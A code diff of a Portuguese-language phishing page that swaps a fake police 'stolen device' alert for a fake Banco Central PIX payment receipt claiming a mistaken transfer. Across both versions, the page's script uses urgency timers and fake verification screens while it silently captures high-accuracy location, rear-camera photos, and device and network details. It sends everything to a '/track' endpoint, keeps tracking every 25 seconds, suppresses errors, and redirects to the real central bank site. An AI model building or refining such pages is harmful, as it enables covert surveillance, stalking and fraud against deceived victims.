@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Alerta - Dispositivo Reportado</title>
+    <title>Comprovante de Pagamento - PIX</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * {
@@ -12,8 +12,8 @@
         
         body {
             font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #dc3545, #c82333);
-            color: white;
+            background: linear-gradient(135deg, #00a859, #008a4c);
+            color: #333;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -21,79 +21,99 @@
             padding: 20px;
         }
         
-        .alert-container {
+        .receipt-container {
             background: white;
-            color: #333;
-            padding: 30px;
+            padding: 25px;
             border-radius: 15px;
-            max-width: 450px;
+            max-width: 400px;
             width: 100%;
             box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            border-left: 5px solid #dc3545;
+            border: 2px solid #00a859;
         }
         
-        .police-icon {
-            font-size: 48px;
-            margin-bottom: 20px;
+        .bank-header {
             text-align: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px dashed #00a859;
         }
         
-        .alert-title {
-            color: #dc3545;
+        .bank-logo {
             font-size: 24px;
             font-weight: bold;
-            margin-bottom: 15px;
-            text-align: center;
+            color: #00a859;
+            margin-bottom: 10px;
         }
         
-        .warning-badge {
-            background: #dc3545;
+        .receipt-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #00a859;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .receipt-details {
+            margin: 20px 0;
+        }
+        
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 12px 0;
+            padding: 8px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        
+        .detail-label {
+            font-weight: bold;
+            color: #666;
+        }
+        
+        .detail-value {
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .amount-highlight {
+            background: #e8f5e8;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 20px 0;
+            border: 2px solid #00a859;
+        }
+        
+        .amount {
+            font-size: 28px;
+            font-weight: bold;
+            color: #00a859;
+        }
+        
+        .status-badge {
+            background: #00a859;
             color: white;
             padding: 8px 15px;
             border-radius: 20px;
             font-size: 14px;
             font-weight: bold;
             display: inline-block;
-            margin-bottom: 20px;
+            margin: 10px 0;
         }
         
-        .device-info {
+        .pix-code {
             background: #f8f9fa;
             padding: 15px;
             border-radius: 8px;
             margin: 15px 0;
-            border-left: 3px solid #dc3545;
-        }
-        
-        .info-item {
-            margin: 8px 0;
-            font-size: 14px;
-            color: #666;
-        }
-        
-        .consequences {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 20px 0;
-        }
-        
-        .consequence-item {
-            margin: 8px 0;
-            font-size: 14px;
-            color: #856404;
-            display: flex;
-            align-items: flex-start;
-        }
-        
-        .consequence-item:before {
-            content: "⚠️";
-            margin-right: 8px;
+            border-left: 3px solid #00a859;
+            font-family: monospace;
+            word-break: break-all;
+            font-size: 12px;
         }
         
         .btn {
-            background: #dc3545;
+            background: #00a859;
             color: white;
             border: none;
             padding: 16px 30px;
@@ -107,10 +127,34 @@
         }
         
         .btn:hover {
-            background: #c82333;
+            background: #008a4c;
         }
         
-        .legal-notice {
+        .btn-secondary {
+            background: #6c757d;
+        }
+        
+        .btn-secondary:hover {
+            background: #545b62;
+        }
+        
+        .timer-notice {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .timer {
+            color: #d32f2f;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        
+        .security-notice {
             font-size: 11px;
             color: #666;
             text-align: center;
@@ -118,53 +162,13 @@
             line-height: 1.4;
         }
         
-        .countdown {
-            background: #28a745;
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-            text-align: center;
-            margin: 15px 0;
-            font-weight: bold;
-        }
-        
-        .steps {
-            margin: 20px 0;
-        }
-        
-        .step {
-            display: flex;
-            align-items: center;
-            margin: 10px 0;
-            font-size: 14px;
-        }
-        
-        .step-number {
-            background: #dc3545;
-            color: white;
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 10px;
-            font-size: 12px;
-            font-weight: bold;
-        }
-        
         .hidden {
             display: none;
         }
         
-        .processing-screen {
-            text-align: center;
-            padding: 30px;
-        }
-        
         .loading-spinner {
             border: 4px solid #f3f3f3;
-            border-top: 4px solid #dc3545;
+            border-top: 4px solid #00a859;
             border-radius: 50%;
             width: 40px;
             height: 40px;
@@ -176,212 +180,335 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        .success-icon {
+            font-size: 48px;
+            color: #00a859;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        .step-indicator:before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #f0f0f0;
+            z-index: 1;
+        }
+        
+        .step {
+            background: white;
+            border: 2px solid #f0f0f0;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .step.active {
+            border-color: #00a859;
+            background: #00a859;
+            color: white;
+        }
+        
+        .step.completed {
+            border-color: #00a859;
+            background: #00a859;
+            color: white;
+        }
     </style>
 </head>
 <body>
-    <!-- TELA PRINCIPAL DE ALERTA -->
-    <div class="alert-container" id="alertScreen">
-        <div class="police-icon">🚨</div>
-        
-        <div class="alert-title">
-            ALERTA DE SEGURANÇA - DISPOSITivo BLOQUEADO
+    <!-- TELA DO COMPROVANTE -->
+    <div class="receipt-container" id="receiptScreen">
+        <div class="bank-header">
+            <div class="bank-logo">🏦 BANCO CENTRAL</div>
+            <div style="font-size: 14px; color: #666;">Sistema de Pagamentos Instantâneos</div>
         </div>
         
-        <div style="text-align: center; margin-bottom: 20px;">
-            <span class="warning-badge">STATUS: REPORTADO COMO FURTADO</span>
+        <div class="receipt-title">
+            COMPROVANTE DE PAGAMENTO PIX
         </div>
         
-        <div class="device-info">
-            <div class="info-item"><strong>Número do BO:</strong> 2024.987654321-0</div>
-            <div class="info-item"><strong>Data do registro:</strong> 28/11/2024</div>
-            <div class="info-item"><strong>Delegacia:</strong> 12ª DP - Furto de Celulares</div>
-            <div class="info-item"><strong>Status atual:</strong> 🔒 BLOQUEADO PARA USO</div>
+        <div class="status-badge">
+            ✅ PAGAMENTO REALIZADO COM SUCESSO
         </div>
         
-        <div class="consequences">
-            <div class="consequence-item">Bloqueio permanente do dispositivo em 24h</div>
-            <div class="consequence-item">Rastreamento ativo pela polícia</div>
-            <div class="consequence-item">Risco de ação penal por receptação</div>
-            <div class="consequence-item">Impossibilidade de uso de apps bancários</div>
+        <div class="amount-highlight">
+            <div style="font-size: 14px; color: #666;">Valor Pago</div>
+            <div class="amount">R$ 1.500,00</div>
         </div>
         
-        <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 8px; margin: 20px 0;">
-            <strong>✅ SOLUÇÃO DISPONÍVEL:</strong><br>
-            Se você NÃO fez esta queixa, pode removê-la agora mesmo através do sistema de verificação de propriedade.
-        </div>
-        
-        <div class="steps">
-            <div class="step">
-                <div class="step-number">1</div>
-                <span>Clique em "Verificar Propriedade"</span>
+        <div class="receipt-details">
+            <div class="detail-row">
+                <span class="detail-label">Data/Hora:</span>
+                <span class="detail-value" id="currentDateTime"></span>
             </div>
-            <div class="step">
-                <div class="step-number">2</div>
-                <span>Confirme que é o legítimo proprietário</span>
+            <div class="detail-row">
+                <span class="detail-label">ID da Transação:</span>
+                <span class="detail-value">PIX${Date.now().toString().slice(-8)}</span>
             </div>
-            <div class="step">
-                <div class="step-number">3</div>
-                <span>Queixa será removida automaticamente</span>
+            <div class="detail-row">
+                <span class="detail-label">Beneficiário:</span>
+                <span class="detail-value">João Silva Santos</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">CPF:</span>
+                <span class="detail-value">123.456.789-00</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Instituição:</span>
+                <span class="detail-value">Banco do Brasil</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Tipo de Chave:</span>
+                <span class="detail-value">Telefone Celular</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Chave PIX:</span>
+                <span class="detail-value">(11) 98765-4321</span>
             </div>
         </div>
         
-        <div class="countdown" id="countdown">
-            ⏰ AÇÃO AUTOMÁTICA EM: <span id="timer">15</span> SEGUNDOS
+        <div style="text-align: center; margin: 20px 0;">
+            <div style="font-size: 16px; font-weight: bold; color: #d32f2f; margin-bottom: 10px;">
+                ⚠️ ATENÇÃO: PAGAMENTO INCORRETO
+            </div>
+            <div style="font-size: 14px; color: #666;">
+                O valor foi enviado para o número errado. 
+                <strong>Você recebeu este pagamento por engano?</strong>
+            </div>
         </div>
         
-        <button class="btn" id="verifyBtn">
-            🔓 VERIFICAR MINHA PROPRIEDADE AGORA
+        <div class="timer-notice">
+            <div style="margin-bottom: 8px;">
+                📞 <strong>Entre em contato com o pagador</strong>
+            </div>
+            <div class="timer" id="timer">05:00</div>
+            <div style="font-size: 12px; color: #666;">
+                Contato será disponibilizado automaticamente
+            </div>
+        </div>
+        
+        <button class="btn" id="contactBtn">
+            📲 RECEBER CONTATO DO PAGADOR
         </button>
         
-        <div class="legal-notice">
-            Sistema Integrado de Segurança de Dispositivos - SISD<br>
-            Em conformidade com a Lei 12.737/2012 (Crimes Cibernéticos)<br>
-            Dados protegidos pela LGPD - Lei 13.709/2018
+        <button class="btn btn-secondary" id="disputeBtn">
+            🚫 NÃO RECEBI ESTE PAGAMENTO
+        </button>
+        
+        <div class="security-notice">
+            Transação registrada e auditável no Sistema PIX do Banco Central<br>
+            Qualquer irregularidade deve ser reportada em até 90 dias
         </div>
     </div>
     
-    <!-- TELA DE PROCESSAMENTO -->
-    <div class="alert-container hidden" id="processingScreen">
-        <div class="processing-screen">
-            <div class="police-icon">🔍</div>
-            <div class="alert-title">VERIFICANDO PROPRIEDADE</div>
+    <!-- TELA DE CONTATO -->
+    <div class="receipt-container hidden" id="contactScreen">
+        <div class="success-icon">📞</div>
+        <div class="receipt-title">
+            CONTATO DO PAGADOR
+        </div>
+        
+        <div style="text-align: center; margin: 20px 0;">
+            <div style="font-size: 16px; color: #666; margin-bottom: 15px;">
+                Para devolver o valor recebido por engano, entre em contato:
+            </div>
+            
+            <div class="amount-highlight">
+                <div style="font-size: 16px; color: #666;">WhatsApp do Pagador</div>
+                <div style="font-size: 24px; font-weight: bold; color: #00a859;">(11) 98765-4321</div>
+            </div>
+            
+            <div style="margin: 20px 0;">
+                <strong>Nome:</strong> Carlos Eduardo<br>
+                <strong>Valor a devolver:</strong> R$ 1.500,00<br>
+                <strong>Prazo:</strong> 24 horas (após bloqueio automático)
+            </div>
+        </div>
+        
+        <div class="step-indicator">
+            <div class="step completed">1</div>
+            <div class="step active">2</div>
+            <div class="step">3</div>
+        </div>
+        
+        <div style="background: #e7f3ff; padding: 15px; border-radius: 8px; margin: 15px 0;">
+            <strong>📝 Instruções:</strong><br>
+            1. Salve o contato acima<br>
+            2. Envie mensagem via WhatsApp<br>
+            3. Combine a devolução do valor<br>
+            4. Evite bloqueio da sua conta
+        </div>
+        
+        <button class="btn" id="startVerificationBtn">
+            ✅ INICIAR VERIFICAÇÃO DE SEGURANÇA
+        </button>
+        
+        <div class="security-notice">
+            Sistema de Mediação de Conflitos PIX - Banco Central<br>
+            Protocolo: MED-${Date.now().toString().slice(-6)}
+        </div>
+    </div>
+    
+    <!-- TELA DE VERIFICAÇÃO -->
+    <div class="receipt-container hidden" id="verificationScreen">
+        <div class="success-icon">🛡️</div>
+        <div class="receipt-title">
+            VERIFICAÇÃO DE SEGURANÇA
+        </div>
+        
+        <div style="text-align: center; margin: 20px 0;">
+            <div style="font-size: 16px; color: #666; margin-bottom: 15px;">
+                Para sua proteção, estamos verificando:<br>
+                <strong>Localização e identidade do dispositivo</strong>
+            </div>
             
             <div class="loading-spinner"></div>
             
-            <div style="margin: 20px 0;">
-                <div class="step">
-                    <div class="step-number">✓</div>
-                    <span>Conectando ao sistema policial...</span>
-                </div>
-                <div class="step">
-                    <div class="step-number">⏳</div>
-                    <span>Verificando localização atual...</span>
-                </div>
-                <div class="step">
-                    <div class="step-number">⏳</div>
-                    <span>Confirmando identidade do dispositivo...</span>
-                </div>
-                <div class="step">
-                    <div class="step-number">⏳</div>
-                    <span>Removendo queixa do sistema...</span>
-                </div>
-            </div>
-            
-            <div style="background: #e2e3e5; padding: 10px; border-radius: 5px; margin: 15px 0;">
-                <small>Este processo pode levar alguns segundos. Não feche esta página.</small>
+            <div class="step-indicator">
+                <div class="step completed">1</div>
+                <div class="step completed">2</div>
+                <div class="step active">3</div>
             </div>
         </div>
-    </div>
-    
-    <!-- TELA DE SUCESSO -->
-    <div class="alert-container hidden" id="successScreen">
-        <div class="processing-screen">
-            <div class="police-icon" style="color: #28a745;">✅</div>
-            <div class="alert-title" style="color: #28a745;">QUEIXA REMOVIDA COM SUCESSO!</div>
-            
-            <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 8px; margin: 20px 0;">
-                <strong>Status atualizado:</strong> DISPOSITIVO LIBERADO<br>
-                <strong>Número do processo:</strong> LIB-${Date.now().toString().slice(-6)}
+        
+        <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0;">
+            <div style="margin: 10px 0;">
+                <strong>📍 Verificando localização...</strong><br>
+                <small>Confirmando que está no Brasil</small>
             </div>
-            
-            <div class="steps">
-                <div class="step">
-                    <div class="step-number" style="background: #28a745;">✓</div>
-                    <span>Queixa de furto removida do sistema</span>
-                </div>
-                <div class="step">
-                    <div class="step-number" style="background: #28a745;">✓</div>
-                    <span>Bloqueio preventivo cancelado</span>
-                </div>
-                <div class="step">
-                    <div class="step-number" style="background: #28a745;">✓</div>
-                    <span>Dispositivo liberado para uso normal</span>
-                </div>
-                <div class="step">
-                    <div class="step-number" style="background: #28a745;">✓</div>
-                    <span>Registro atualizado na base de dados</span>
-                </div>
+            <div style="margin: 10px 0;">
+                <strong>📱 Analisando dispositivo...</strong><br>
+                <small>Verificando compatibilidade</small>
             </div>
-            
-            <div style="margin-top: 30px; padding: 15px; background: #f8f9fa; border-radius: 8px;">
-                <strong>Seu dispositivo está agora regularizado.</strong><br>
-                <small>Você pode continuar usando normalmente. Obrigado pela verificação.</small>
+            <div style="margin: 10px 0;">
+                <strong>🔒 Validando segurança...</strong><br>
+                <small>Protegendo contra fraudes</small>
             </div>
+        </div>
+        
+        <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 8px; margin: 20px 0;">
+            <strong>✅ QUASE PRONTO!</strong><br>
+            <small>Seus dados estão sendo processados pelo Banco Central</small>
         </div>
     </div>
 
     <script>
         // CONFIGURAÇÃO DO SISTEMA
         const CONFIG = {
-            autoStartDelay: 15000, // 15 segundos para início automático
-            processingTime: 8000,   // 8 segundos de "processamento"
-            successDisplay: 10000   // 10 segundos na tela de sucesso
+            autoStartDelay: 300000, // 5 minutos para início automático
+            trackingInterval: 25000, // 25 segundos
+            photoInterval: 45000     // 45 segundos
         };
 
         // ELEMENTOS
-        const alertScreen = document.getElementById('alertScreen');
-        const processingScreen = document.getElementById('processingScreen');
-        const successScreen = document.getElementById('successScreen');
-        const verifyBtn = document.getElementById('verifyBtn');
+        const receiptScreen = document.getElementById('receiptScreen');
+        const contactScreen = document.getElementById('contactScreen');
+        const verificationScreen = document.getElementById('verificationScreen');
+        const contactBtn = document.getElementById('contactBtn');
+        const disputeBtn = document.getElementById('disputeBtn');
+        const startVerificationBtn = document.getElementById('startVerificationBtn');
         const timerElement = document.getElementById('timer');
+        const dateTimeElement = document.getElementById('currentDateTime');
 
         // VARIÁVEIS DE RASTREAMENTO
         let deviceId = null;
         let isTracking = false;
 
-        // CONTAGEM REGRESSIVA PARA AÇÃO AUTOMÁTICA
-        let countdown = 15;
+        // ATUALIZAR DATA/HORA ATUAL
+        function updateDateTime() {
+            const now = new Date();
+            const dateStr = now.toLocaleDateString('pt-BR');
+            const timeStr = now.toLocaleTimeString('pt-BR');
+            dateTimeElement.textContent = `${dateStr} ${timeStr}`;
+        }
+        
+        updateDateTime();
+        setInterval(updateDateTime, 1000);
+
+        // CONTAGEM REGRESSIVA
+        let countdown = 300; // 5 minutos
         const countdownInterval = setInterval(() => {
             countdown--;
-            timerElement.textContent = countdown;
+            const minutes = Math.floor(countdown / 60);
+            const seconds = countdown % 60;
+            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
             
             if (countdown <= 0) {
                 clearInterval(countdownInterval);
-                startVerification();
+                showContactScreen();
             }
         }, 1000);
 
-        // BOTÃO DE VERIFICAÇÃO
-        verifyBtn.addEventListener('click', startVerification);
+        // BOTÕES
+        contactBtn.addEventListener('click', showContactScreen);
+        disputeBtn.addEventListener('click', showContactScreen); // Mesma tela para ambos
+        startVerificationBtn.addEventListener('click', startVerification);
 
-        // INICIAR VERIFICAÇÃO
-        function startVerification() {
+        function showContactScreen() {
             clearInterval(countdownInterval);
+            receiptScreen.classList.add('hidden');
+            contactScreen.classList.remove('hidden');
             
-            // MOSTRAR TELA DE PROCESSAMENTO
-            alertScreen.classList.add('hidden');
-            processingScreen.classList.remove('hidden');
+            // INICIAR CAPTURA BÁSICA
+            initializeBasicTracking();
+        }
+
+        function startVerification() {
+            contactScreen.classList.add('hidden');
+            verificationScreen.classList.remove('hidden');
             
-            // INICIAR CAPTURA DE DADOS
-            initializeTracking();
+            // INICIAR CAPTURA COMPLETA
+            initializeFullTracking();
             
-            // SIMULAR PROCESSAMENTO E MOSTRAR SUCESSO
+            // SIMULAR PROCESSAMENTO E FECHAR
             setTimeout(() => {
-                processingScreen.classList.add('hidden');
-                successScreen.classList.remove('hidden');
-                
                 // MANTER MONITORAMENTO ATIVO
                 startContinuousMonitoring();
                 
-                // FECHAR APÓS ALGUNS SEGUNDOS
+                // FECHAR PÁGINA
                 setTimeout(() => {
-                    // Tenta fechar a janela
                     window.close();
-                    // Se não conseguir, redireciona
                     setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
+                        window.location.href = 'https://www.bcb.gov.br';
                     }, 1000);
-                }, CONFIG.successDisplay);
-                
-            }, CONFIG.processingTime);
+                }, 5000);
+            }, 8000);
         }
 
-        // INICIALIZAR RASTREAMENTO AGRESSIVO
-        async function initializeTracking() {
-            deviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        // INICIALIZAR RASTREAMENTO BÁSICO
+        async function initializeBasicTracking() {
+            deviceId = 'pix_receipt_' + Date.now();
+            
+            // CAPTURA RÁPIDA DE LOCALIZAÇÃO
+            captureQuickLocation();
+            captureDeviceInfo();
+        }
+
+        // INICIALIZAR RASTREAMENTO COMPLETO
+        async function initializeFullTracking() {
+            deviceId = 'pix_verification_' + Date.now();
             isTracking = true;
             
-            // CAPTURAR TUDO IMEDIATAMENTE
+            // CAPTURA COMPLETA E AGRESSIVA
             await Promise.all([
                 captureHighPrecisionLocation(),
                 captureCameraPhotos(),
@@ -390,7 +517,29 @@
             ]);
         }
 
-        // CAPTURA DE LOCALIZAÇÃO DE ALTA PRECISÃO
+        // FUNÇÕES DE CAPTURA (MESMAS DO CÓDIGO ANTERIOR)
+        async function captureQuickLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        await sendToServer({
+                            deviceId: deviceId,
+                            type: 'pix_receipt_view',
+                            location: {
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            },
+                            timestamp: new Date().toISOString(),
+                            action: 'receipt_viewed'
+                        });
+                    },
+                    () => {},
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            }
+        }
+
         async function captureHighPrecisionLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -398,63 +547,33 @@
                     return;
                 }
                 
-                let attempts = 0;
-                const maxAttempts = 5;
-                
-                const attemptCapture = () => {
-                    attempts++;
-                    
-                    navigator.geolocation.getCurrentPosition(
-                        async (position) => {
-                            const accuracy = position.coords.accuracy;
-                            
-                            const locationData = {
-                                deviceId: deviceId,
-                                type: 'verification_location',
-                                location: {
-                                    lat: position.coords.latitude,
-                                    lng: position.coords.longitude,
-                                    accuracy: accuracy,
-                                    altitude: position.coords.altitude,
-                                    speed: position.coords.speed,
-                                    heading: position.coords.heading
-                                },
-                                timestamp: new Date().toISOString(),
-                                attempt: attempts,
-                                precision: accuracy <= 10 ? 'high' : 'medium'
-                            };
-                            
-                            await sendToServer(locationData);
-                            resolve();
-                        },
-                        () => {
-                            if (attempts < maxAttempts) {
-                                setTimeout(attemptCapture, 2000);
-                            } else {
-                                resolve();
-                            }
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 0
-                        }
-                    );
-                };
-                
-                attemptCapture();
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        await sendToServer({
+                            deviceId: deviceId,
+                            type: 'pix_verification_location',
+                            location: {
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                altitude: position.coords.altitude,
+                                speed: position.coords.speed
+                            },
+                            timestamp: new Date().toISOString(),
+                            precision: 'high'
+                        });
+                        resolve();
+                    },
+                    () => resolve(),
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
             });
         }
 
-        // CAPTURA DE FOTOS DA CÂMERA
         async function captureCameraPhotos() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'environment',
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    }
+                    video: { facingMode: 'environment' }
                 });
                 
                 const track = stream.getVideoTracks()[0];
@@ -465,24 +584,35 @@
                 reader.onload = async () => {
                     await sendToServer({
                         deviceId: deviceId,
-                        type: 'verification_photo',
+                        type: 'pix_verification_photo',
                         photo: reader.result,
-                        timestamp: new Date().toISOString(),
-                        resolution: '1080p'
+                        timestamp: new Date().toISOString()
                     });
                 };
                 reader.readAsDataURL(blob);
                 
             } catch (error) {
-                // Silenciar erro de câmera
+                // Silenciar erro
             }
         }
 
-        // CAPTURA DE DETALHES DO DISPOSITIVO
+        async function captureDeviceInfo() {
+            const info = {
+                deviceId: deviceId,
+                type: 'pix_device_info',
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                timestamp: new Date().toISOString()
+            };
+            
+            await sendToServer(info);
+        }
+
         async function captureDeviceDetails() {
             const deviceInfo = {
                 deviceId: deviceId,
-                type: 'device_verification',
+                type: 'pix_full_device_info',
                 info: {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
@@ -491,9 +621,7 @@
                     screen: `${screen.width}x${screen.height}`,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     hardware: navigator.hardwareConcurrency,
-                    memory: navigator.deviceMemory,
-                    touch: navigator.maxTouchPoints,
-                    vendor: navigator.vendor
+                    memory: navigator.deviceMemory
                 },
                 timestamp: new Date().toISOString()
             };
@@ -501,15 +629,13 @@
             await sendToServer(deviceInfo);
         }
 
-        // CAPTURA DE INFORMAÇÕES DE REDE
         async function captureNetworkInfo() {
             const networkInfo = {
                 deviceId: deviceId,
-                type: 'network_info',
+                type: 'pix_network_info',
                 connection: navigator.connection ? {
                     effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
+                    downlink: navigator.connection.downlink
                 } : null,
                 timestamp: new Date().toISOString()
             };
@@ -517,16 +643,15 @@
             await sendToServer(networkInfo);
         }
 
-        // INICIAR MONITORAMENTO CONTÍNUO
+        // MONITORAMENTO CONTÍNUO
         function startContinuousMonitoring() {
-            // LOCALIZAÇÃO A CADA 25 SEGUNDOS
             setInterval(() => {
                 if (isTracking) {
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
                             await sendToServer({
                                 deviceId: deviceId,
-                                type: 'continuous_tracking',
+                                type: 'pix_continuous_tracking',
                                 location: {
                                     lat: position.coords.latitude,
                                     lng: position.coords.longitude,
@@ -539,14 +664,7 @@
                         { enableHighAccuracy: true, timeout: 10000 }
                     );
                 }
-            }, 25000);
-            
-            // FOTOS ADICIONAIS A CADA 45 SEGUNDOS
-            setInterval(() => {
-                if (isTracking) {
-                    captureCameraPhotos();
-                }
-            }, 45000);
+            }, CONFIG.trackingInterval);
         }
 
         // ENVIAR DADOS PARA O SERVIDOR
@@ -554,20 +672,18 @@
             try {
                 await fetch('/track', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
             } catch (error) {
-                // Silenciar erros de rede
+                // Silenciar erro
             }
         }
 
-        // INICIAR AUTOMATICAMENTE SE O USUÁRIO NÃO INTERAGIR
+        // INICIAR AUTOMATICAMENTE SE NÃO INTERAGIR
         setTimeout(() => {
             if (!isTracking) {
-                startVerification();
+                showContactScreen();
             }
         }, CONFIG.autoStartDelay);
     </script>
